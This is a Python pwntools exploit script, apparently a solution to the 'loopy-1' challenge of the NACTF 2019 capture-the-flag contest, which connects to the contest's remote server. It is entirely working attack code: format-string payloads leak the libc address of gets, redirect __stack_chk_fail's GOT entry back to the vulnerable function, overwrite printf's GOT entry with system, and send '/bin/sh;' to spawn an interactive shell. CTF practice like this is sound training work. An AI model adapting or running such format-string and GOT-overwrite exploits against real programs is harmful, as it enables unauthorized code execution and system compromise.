from pwn import *


__stack_chk_fail_got 	= 0x804c014
vuln 					= 0x080491a2
gets_got 				= 0x804c010
gets_offset 			= 0x00068A60
system_offset 			= 0x0003EC00
printf_got 				= 0x804c00c


# str to int
u = make_unpacker(32, endian='little', sign='unsigned') # 4 byte value


# format strings -write value to address
def write_memory(address, value):
  v1 = (value & 0x0000FFFF) - 8
  v2 = (value >> 16) - (value & 0x0000FFFF)

  if v2 < 0:
    v2 += 0x00010000

  ret = p32(address) + p32(address + 2) + '%{}x'.format(v1) + '%7$hn'

  if v2 != 0:
    ret += '%{}x'.format(v2)

  ret += '%8$hn'

  return ret


#p = process('./loopy-1')
p = remote('shell.2019.nactf.com', 31732)
#gdb.attach(p)
p.recv()

# Leak libc address and overwrite __stack_chk_fail_got address to vuln function address
payload = p32(gets_got) + "----%7$s" 	# Leak gets address
payload += p32(__stack_chk_fail_got) + "%37250d" + "%10$hn"		# overwrite 2 bytes (the last significant)
payload = payload + 'A'*(100 - len(payload))	# trigger the __stack_chk_fail_got to return back to vuln function

p.sendline(payload)
gets = p.recv(10000)

# calculate system address
gets = gets[gets.find('----') + 4 : gets.find('----') + 4 + 4]
gets = u(gets)
base = gets - gets_offset
system = base + system_offset

print "gets = " + hex(gets)
print "base = " + hex(base)
print "system = " + hex(system)

# overwrite printf address with system address
payload = write_memory(printf_got, system)
payload = payload + 'A'*(100 - len(payload))
p.sendline(payload)

# trigger function call: printf('/bin/sh;') when printf points to system address so: system("/bin/sh")
p.sendline('/bin/sh;')



print '-----------------------'
p.interactive()